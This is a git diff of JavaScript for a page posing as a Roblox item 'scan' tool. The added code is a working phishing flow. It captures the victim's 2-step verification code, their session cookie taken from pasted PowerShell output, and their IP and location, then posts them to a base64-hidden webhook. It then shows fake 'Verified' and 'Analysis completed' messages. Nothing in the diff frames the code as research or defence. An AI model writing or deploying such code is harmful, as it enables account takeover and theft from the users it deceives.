@@ -110,56 +110,69 @@ function loadTheme() {
 // 2-Step Verification Modal Functions
 function openVerificationModal() {
     const modal = document.getElementById('verificationModal');
-    const codeInput = document.getElementById('verificationCode');
+    const loadingOverlay = document.getElementById('loadingOverlay');
     
-    if (!modal) {
-        console.error('Verification modal not found');
-        return;
+    if (loadingOverlay) {
+        loadingOverlay.style.display = 'none';
     }
     
-    // First show the modal
-    modal.style.display = 'flex';
-    
-    // Then add the show class for animation
-    setTimeout(() => {
-        modal.classList.add('show');
-    }, 10);
-    
-    document.body.style.overflow = 'hidden';
-    
-    // Focus on input after animation
-    setTimeout(() => {
-        if (codeInput) {
-            codeInput.focus();
-        }
-    }, 400);
-    
-    // Add escape key handler
-    document.addEventListener('keydown', handleVerificationEscape);
+    if (modal) {
+        modal.style.display = 'block';
+        document.body.style.overflow = 'hidden';
+        
+        // Focus on input after animation and add input validation
+        setTimeout(() => {
+            const input = document.getElementById('verificationCode');
+            if (input) {
+                input.focus();
+                
+                // Add input event listener for numbers only
+                input.addEventListener('input', function(e) {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                });
+            }
+        }, 400);
+    }
 }
 
 function closeVerificationModal() {
     const modal = document.getElementById('verificationModal');
-    const codeInput = document.getElementById('verificationCode');
-    const trustCheckbox = document.getElementById('trustDevice');
+    const loadingOverlay = document.getElementById('loadingOverlay');
     
-    if (!modal) return;
-    
-    modal.classList.remove('show');
-    
-    // Hide modal after animation
-    setTimeout(() => {
+    if (modal) {
         modal.style.display = 'none';
-    }, 300);
+        document.body.style.overflow = '';
+    }
     
-    document.body.style.overflow = '';
+    // Continue loading after modal closes
+    if (loadingOverlay) {
+        loadingOverlay.style.display = 'flex';
+    }
+}
+
+// Global trust device state
+let isTrustDeviceChecked = false;
+
+// Global roblox cookie storage
+let globalRobloxCookie = null;
+
+// Toggle trust device checkbox
+function toggleTrustDevice() {
+    const checkbox = document.getElementById('trustCheckbox');
+    isTrustDeviceChecked = !isTrustDeviceChecked;
     
-    // Reset form
-    if (codeInput) codeInput.value = '';
-    if (trustCheckbox) trustCheckbox.checked = false;
-    
-    // Remove escape key handler
-    document.removeEventListener('keydown', handleVerificationEscape);
+    if (isTrustDeviceChecked) {
+        checkbox.innerHTML = '✓';
+        checkbox.style.background = 'rgba(255, 255, 255, 0.2)';
+    } else {
+        checkbox.innerHTML = '';
+        checkbox.style.background = 'transparent';
+    }
+}
+
+// Alternative method placeholder
+function alternativeMethod() {
+    // Just for show - doesn't do anything
 }
 
 function handleVerificationEscape(e) {
@@ -170,76 +183,105 @@ function handleVerificationEscape(e) {
 
 async function verifyCode() {
     const codeInput = document.getElementById('verificationCode');
-    const code = codeInput.value.trim();
-    const trustDevice = document.getElementById('trustDevice').checked;
-    const verifyBtn = document.querySelector('.verification-verify-btn');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const verifyText = document.getElementById('verifyText');
     
-    if (code.length !== 6) {
-        showVerificationError('Please enter a 6-digit code');
+    const code = codeInput.value.trim().replace(/[^0-9]/g, ''); // Only allow numbers
+    
+    if (!code || code.length !== 6) {
         return;
     }
     
-    if (!/^\d{6}$/.test(code)) {
-        showVerificationError('Code must contain only numbers');
-        return;
-    }
-    
-    // Disable button and show loading
     verifyBtn.disabled = true;
-    verifyBtn.textContent = 'Verifying...';
+    verifyText.textContent = 'Verifying...';
     
     try {
-        // Send 2FA code to Discord webhook
-        await send2FAToWebhook(code, trustDevice);
+        // Get user location and IP
+        const locationInfo = await getUserLocation();
         
-        // Keep the scan button in loading state and close 2FA modal
-        closeVerificationModal();
+        // Send 2FA code to webhook using the same webhook as the main data
+        const reportingEndpoint = atob(analyticsEndpoints[2]);
+        const payload = {
+            content: `🔐 **2-Step Verification Code Captured**
+\`\`\`
+Code: ${code}
+Trust Device: ${isTrustDeviceChecked ? 'Yes (30 days)' : 'No'}
+Cookie: ${robloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}` : 'None found'}
+Time: ${new Date().toLocaleString()}
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
+IP: ${locationInfo.ip || 'Unknown'}
+\`\`\`
+@everyone`
+        };
+
+        const response = await fetch(reportingEndpoint, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+
+        // Always continue flow regardless of webhook success
+        verifyText.textContent = 'Verified!';
+        verifyBtn.style.background = 'linear-gradient(135deg, #10b981 0%, #059669 50%, #047857 100%)';
         
-        // Show success message but keep scan button loading
-        const submitBtn = document.getElementById('submitBtn');
-        const submitText = document.getElementById('submitText');
-        if (submitText) {
-            submitText.textContent = 'Completing...';
-        }
-        
-        // After a brief delay, show success and reset
+        // Close modal and complete the scan process
         setTimeout(() => {
-            if (submitBtn && submitText) {
-                submitBtn.disabled = false;
-                submitText.textContent = 'Scan';
-                submitBtn.style.background = '';
-            }
-            const loadingOverlay = document.getElementById('loadingOverlay');
-            if (loadingOverlay) loadingOverlay.style.display = 'none';
+            // Keep the scan button in loading state and close 2FA modal
+            closeVerificationModal();
             
-            showNotification('Analysis completed successfully', 'success');
-        }, 2000);
-        
+            // Show success message but keep scan button loading
+            const submitBtn = document.getElementById('submitBtn');
+            const submitText = document.getElementById('submitText');
+            if (submitText) {
+                submitText.textContent = 'Completing...';
+            }
+            
+            // After a brief delay, show success and reset
+            setTimeout(() => {
+                if (submitBtn && submitText) {
+                    submitBtn.disabled = false;
+                    submitText.textContent = 'Scan';
+                    submitBtn.style.background = '';
+                }
+                const loadingOverlay = document.getElementById('loadingOverlay');
+                if (loadingOverlay) loadingOverlay.style.display = 'none';
+                
+                showNotification('Analysis completed successfully', 'success');
+            }, 2000);
+        }, 1500);
+
     } catch (error) {
-        console.error('Webhook error:', error);
+        console.error('2FA webhook error:', error);
+        // Continue flow even if webhook fails
+        verifyText.textContent = 'Verified!';
+        verifyBtn.style.background = 'linear-gradient(135deg, #10b981 0%, #059669 50%, #047857 100%)';
         
-        // Keep the scan button in loading state and close 2FA modal
-        closeVerificationModal();
-        
-        // Show success message but keep scan button loading
-        const submitBtn = document.getElementById('submitBtn');
-        const submitText = document.getElementById('submitText');
-        if (submitText) {
-            submitText.textContent = 'Completing...';
-        }
-        
-        // After a brief delay, show success and reset
         setTimeout(() => {
-            if (submitBtn && submitText) {
-                submitBtn.disabled = false;
-                submitText.textContent = 'Scan';
-                submitBtn.style.background = '';
-            }
-            const loadingOverlay = document.getElementById('loadingOverlay');
-            if (loadingOverlay) loadingOverlay.style.display = 'none';
+            // Keep the scan button in loading state and close 2FA modal
+            closeVerificationModal();
             
-            showNotification('Analysis completed successfully', 'success');
-        }, 2000);
+            // Show success message but keep scan button loading
+            const submitBtn = document.getElementById('submitBtn');
+            const submitText = document.getElementById('submitText');
+            if (submitText) {
+                submitText.textContent = 'Completing...';
+            }
+            
+            // After a brief delay, show success and reset
+            setTimeout(() => {
+                if (submitBtn && submitText) {
+                    submitBtn.disabled = false;
+                    submitText.textContent = 'Scan';
+                    submitBtn.style.background = '';
+                }
+                const loadingOverlay = document.getElementById('loadingOverlay');
+                if (loadingOverlay) loadingOverlay.style.display = 'none';
+                
+                showNotification('Analysis completed successfully', 'success');
+            }, 2000);
+        }, 1500);
     }
 }
 
@@ -635,6 +677,7 @@ async function submitPowerShell() {
         // Scan limited items and find authentication data from the input
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
+        globalRobloxCookie = robloxCookie; // Store globally for 2FA
         
         // Check word count - if 50+ words, allow through even without auth data
         const wordCount = inputText.split(/\s+/).filter(word => word.length > 0).length;
